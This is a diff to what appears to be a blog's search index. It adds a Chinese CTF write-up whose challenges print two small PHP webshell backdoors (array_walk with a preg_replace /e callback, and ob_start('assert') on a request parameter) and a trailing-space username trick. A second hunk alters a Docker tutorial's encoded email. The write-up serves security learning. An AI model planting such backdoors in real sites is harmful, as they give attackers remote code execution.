@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title><![CDATA[week 9 for cnas writeup]]></title>
+      <url>http://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$e = $_REQUEST[&apos;a&apos;]; </div><div class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </div><div class="line">array_walk($arr, $e, &apos;&apos;);</div></pre></td></tr></table></figure>
+<p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p>
+<p>这里用到array_walk函数</p>
+<p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_walk(array,myfunction,userdata...)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>array</td>
+<td style="text-align:center">必需。规定数组。</td>
+</tr>
+<tr>
+<td>myfunction</td>
+<td style="text-align:center">必需。用户自定义函数的名称。</td>
+</tr>
+<tr>
+<td>userdata,…</td>
+<td style="text-align:center">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
+</tr>
+</tbody>
+</table>
+<p>网上给的是用assert函数，但是这里用assert不行。然后在学长的提醒下，这里提到|e，</p>
+<p>所以可以用preg_replace函数.</p>
+<p>如下图构造菜刀连接</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_1.png" alt=""></p>
+<p>或者直接hackbar</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_2.png" alt=""></p>
+<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/index.php" target="_blank" rel="external">http://47.100.121.220:28002/index.php</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">echo &quot;&lt;/br&gt;&quot;; </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">echo &quot;&lt;/br&gt;&quot;; </div><div class="line">highlight_file(&apos;echo.php&apos;); </div><div class="line">?&gt; </div><div class="line">&lt;?php </div><div class="line">ob_start(&apos;assert&apos;); </div><div class="line">echo $_REQUEST[&apos;pass&apos;]; </div><div class="line">ob_end_flush(); </div><div class="line">//关键缓存每5分钟清理一次。&lt;/br&gt; </div><div class="line">&lt;?php </div><div class="line">include &quot;func.php&quot;; </div><div class="line"></div><div class="line">$your_real_ip = real_ip(); </div><div class="line">$path = &quot;temp/&quot;.$your_real_ip.&quot;_http_request_history.txt&quot;; </div><div class="line"></div><div class="line">$url = &apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;]; </div><div class="line">echo $your_real_ip.&quot;&lt;/br&gt;&quot;; </div><div class="line">echo $url; </div><div class="line"></div><div class="line">$fout = null; </div><div class="line">if(file_exists($path)) &#123; </div><div class="line">    $fout = fopen($path, &quot;ab&quot;) or die(&quot;Unable to open file!&quot;); </div><div class="line">&#125; </div><div class="line">else &#123; </div><div class="line">    $fout = fopen($path, &quot;wb&quot;) or die(&quot;Unable to open file!&quot;); </div><div class="line">&#125; </div><div class="line">fwrite($fout, $url.&quot;\n&quot;); </div><div class="line">fclose($fout); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里也提到了一种PHP木马的写法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">ob_start(&apos;assert&apos;); </div><div class="line">echo $_REQUEST[&apos;pass&apos;]; </div><div class="line">ob_end_flush();</div></pre></td></tr></table></figure>
+<p>ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，</p>
+<p>这个PHP木马是没有回显的</p>
+<p>但是在给出的echo.php的代码有给出一些提示</p>
+<p>这里说到的是temp文件夹是有写的权限的。</p>
+<p>所以如下执行</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_3.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_4.png" alt=""></p>
+<h3 id="login-100"><a href="#login-100" class="headerlink" title="login 100"></a>login 100</h3><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目注册完账号登录后会提示你</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">您已登录成功，但只有nari用户才可以看到flag.</div></pre></td></tr></table></figure>
+<p>这里根本没有任何思路的，然后学长告诉我。</p>
+<p>注册nari后加个空格就可以了，我一脸懵逼。他也不知道为什么？</p>
+<p>所以我注册nari加两个空格进去了，拿到flag。</p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[month 2 for cnas writeup]]></title>
       <url>http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
@@ -1094,7 +1152,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#111;&#x6f;&#x40;&#x62;&#97;&#x72;&#46;&#x63;&#111;&#109;">&#x66;&#111;&#x6f;&#x40;&#x62;&#97;&#x72;&#46;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
